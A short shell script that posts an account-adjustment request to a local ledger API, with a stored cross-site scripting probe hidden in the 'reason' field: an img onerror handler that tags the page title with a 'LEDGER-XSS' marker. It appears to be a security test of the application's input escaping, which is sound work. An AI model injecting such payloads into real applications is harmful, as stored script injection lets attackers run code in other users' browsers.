#!/bin/sh
curl -sS -w '\nHTTP %{http_code} in %{time_total}s\n' \
  '-X' \
  'POST' \
  '-H' \
  'Content-Type: application/json' \
  '-d' \
  '{"account_id":"ACC-1188","amount":10,"reason":"goodwill <img src=x onerror=\"document.title=(document.title+&apos;|LEDGER-XSS&apos;)\">","actor":"clerk-a"}' \
  'http://127.0.0.1:8414/api/adjustments' \
  ;
